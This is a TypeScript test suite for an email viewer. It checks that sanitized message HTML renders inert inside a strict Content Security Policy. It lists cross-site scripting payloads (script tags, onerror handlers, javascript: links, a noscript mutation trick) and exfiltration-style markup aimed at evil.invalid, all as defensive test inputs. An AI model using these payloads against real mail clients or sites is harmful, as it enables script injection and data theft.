import { describe, expect, it } from "vitest";
import { buildBodyDocument } from "@/app/(modules)/change-orders/build-body-document";
import { sanitizeEmailHtml } from "@/lib/modules/change-orders/mail/sanitize";
import type { MessageBody } from "@/lib/modules/change-orders/mail/types";

/**
 * The rendering half of the defence.
 *
 * tests/mail-sanitize.test.ts proves the allowlist strips hostile markup. This
 * proves the document the reading pane actually builds around that markup is
 * itself inert - the second layer, not an alternative to the first. docs/03:
 * "Sanitize server-side, render in a sandboxed iframe with CSP, block remote
 * images by default."
 */

function render(html: string, allowRemoteImages = false): string {
  const sanitized = sanitizeEmailHtml(html, { allowRemoteImages });
  const body: MessageBody = {
    content: sanitized.html,
    format: "html",
    remoteImagesBlocked: sanitized.remoteImagesBlocked,
    inlineImages: sanitized.inlineImages,
  };
  return buildBodyDocument(body, allowRemoteImages);
}

function policy(document: string): string {
  return /content="([^"]*)"/.exec(
    /<meta http-equiv="Content-Security-Policy"[^>]*>/.exec(document)?.[0] ?? "",
  )?.[1] ?? "";
}

describe("the content security policy", () => {
  it("denies everything by default", () => {
    expect(policy(render("<p>hi</p>"))).toContain("default-src 'none'");
  });

  it("blocks script, objects, frames, forms and base rewriting", () => {
    const csp = policy(render("<p>hi</p>"));

    for (const directive of [
      "script-src 'none'",
      "object-src 'none'",
      "frame-src 'none'",
      "form-action 'none'",
      "base-uri 'none'",
    ]) {
      expect(csp).toContain(directive);
    }
  });

  it("permits no remote image source by default", () => {
    const csp = policy(render('<img src="https://tracker.invalid/px.gif">'));

    expect(csp).toContain("img-src data:");
    expect(csp).not.toContain("https:");
  });

  it("permits https images only once a person asks", () => {
    expect(policy(render("<p>hi</p>", true))).toContain("img-src https: data:");
  });

  /**
   * `cid:` was in `img-src` until the sanitizer started removing a `cid:` src
   * outright - a browser cannot resolve the scheme, and the broken-image glyph
   * it produced read as an application fault. Nothing in the document can carry
   * one any more, so permitting it would describe a case that cannot arise.
   */
  it("no longer permits cid:, because no cid: src reaches the document", () => {
    const document = render('<img src="cid:logo123" alt="logo">');

    expect(policy(document)).not.toContain("cid:");
    expect(document).not.toContain("cid:logo123");
    // Marked instead, so the stylesheet can draw it as a labelled placeholder.
    expect(document).toContain("data-inline-image");
  });

  it("sends no referrer, so opening a message leaks no URL", () => {
    expect(render("<p>hi</p>")).toContain('name="referrer" content="no-referrer"');
  });
});

describe("hostile bodies render inert", () => {
  const payloads: Array<[string, string]> = [
    ["script tag", "<p>ok</p><script>alert(1)</script>"],
    ["img onerror", '<img src=x onerror="alert(1)">'],
    ["javascript link", '<a href="javascript:alert(1)">click</a>'],
    ["iframe srcdoc", '<iframe srcdoc="<script>alert(1)</script>"></iframe>'],
    ["svg script", "<svg><script>alert(1)</script></svg>"],
    ["style exfiltration", '<div style="background:url(https://evil.invalid/x)">t</div>'],
    ["meta refresh", '<meta http-equiv="refresh" content="0;url=https://evil.invalid">'],
    ["base tag", '<base href="https://evil.invalid/">'],
    ["form post", '<form action="https://evil.invalid"><input name="p"></form>'],
    ["object", '<object data="javascript:alert(1)"></object>'],
    ["mutation via noscript", '<noscript><p title="</noscript><img src=x onerror=alert(1)>">'],
  ];

  for (const [name, payload] of payloads) {
    it(`${name} survives into no executable markup`, () => {
      const document = render(payload).toLowerCase();

      for (const forbidden of [
        "<script",
        "javascript:",
        "onerror",
        "<iframe",
        "<object",
        "<form",
        "<base",
        "evil.invalid",
      ]) {
        expect(document, `${name} left ${forbidden} in the document`).not.toContain(
          forbidden,
        );
      }
    });
  }

  it("cannot break out of the document it is placed in", () => {
    // A body that closes the document early would put the rest outside the
    // sanitized region.
    const document = render("</body></html><script>alert(1)</script>");

    expect(document.toLowerCase()).not.toContain("<script");
    expect(document.endsWith("</body></html>")).toBe(true);
  });
});

describe("plain text bodies", () => {
  it("are escaped, never interpreted as markup", () => {
    const document = buildBodyDocument(
      {
        content: "<script>alert(1)</script> plain text",
        format: "text",
        remoteImagesBlocked: 0,
        inlineImages: 0,
      },
      false,
    );

    // A text/plain message containing "<script>" is text, and stays text.
    expect(document).toContain("&lt;script&gt;");
    expect(document.toLowerCase()).not.toContain("<script>");
  });

  it("preserve their line breaks", () => {
    const document = buildBodyDocument(
      { content: "line one\nline two", format: "text", remoteImagesBlocked: 0, inlineImages: 0 },
      false,
    );

    expect(document).toContain("<pre>");
  });
});

describe("blocked remote images", () => {
  it("are marked so the reader can see something was withheld", () => {
    const sanitized = sanitizeEmailHtml('<img src="https://tracker.invalid/px.gif">');

    expect(sanitized.remoteImagesBlocked).toBe(1);
    expect(sanitized.html).toContain("data-remote-blocked");
    // The tracker URL is gone entirely, not merely unrendered.
    expect(sanitized.html).not.toContain("tracker.invalid");
  });

  it("degrade visibly rather than collapsing the layout", () => {
    // PHASE-5 asks for cid: images with no attachment resolution to "degrade
    // visibly rather than breaking layout".
    expect(render('<img src="cid:logo123">')).toContain("img[data-remote-blocked]");
  });
});
